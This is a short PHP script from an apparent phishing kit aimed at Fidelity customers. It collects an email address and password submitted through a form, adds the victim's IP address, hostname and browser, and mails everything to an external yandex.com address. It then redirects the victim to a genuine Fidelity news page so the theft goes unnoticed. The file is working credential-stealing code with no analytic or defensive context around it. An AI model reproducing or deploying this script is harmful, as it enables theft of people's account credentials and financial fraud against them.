<?
////////////////////////////////
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----+Fidelity emailSupremeBankLord Logs+------\n";
$message .= "Email Address: ".$_POST['Smmm']."\n";
$message .= "Email Password: ".$_POST['epass1']."\n";
$message .= "-------+  More info about victim  !!!!! +------\n";
$message .= "HostName       : ".$hostname."\n";
$message .= "Browser used   : ".$browser."\n";

$to = "logsoffice2@yandex.com";
$subj = "fidelity Logs  $ip";
$from = "From:SunTrust Bank Logs";
mail($to, $subj, $message, $from);
header("Location: https://news.fidelity.com/news/categorynews.jhtml?cat=Markets.US");
?>





